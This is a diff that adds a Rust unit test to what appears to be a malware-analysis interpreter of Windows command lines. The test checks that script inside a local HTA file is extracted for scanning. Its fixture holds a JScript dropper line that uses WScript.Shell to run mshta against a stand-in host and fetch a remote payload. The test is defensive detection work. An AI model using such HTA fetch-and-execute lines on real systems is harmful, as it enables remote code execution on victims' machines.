@@ -8821,6 +8821,32 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn mshta_local_hta_content_queues_script_block() {
+        let mut env = Environment::new(&Config::default());
+        let hta = br#"<html><script language="JScript">
+new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payload.hta");
+</script></html>"#
+            .to_vec();
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            FsEntry::Content {
+                content: hta,
+                append: false,
+            },
+        );
+        interpret_line("mshta payload.hta", &mut env);
+        assert!(
+            env.all_extracted_jscript.iter().any(|payload| {
+                payload
+                    .windows(b"mshta-local-content.example".len())
+                    .any(|window| window == b"mshta-local-content.example")
+            }),
+            "local HTA script block was not queued for scanning: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
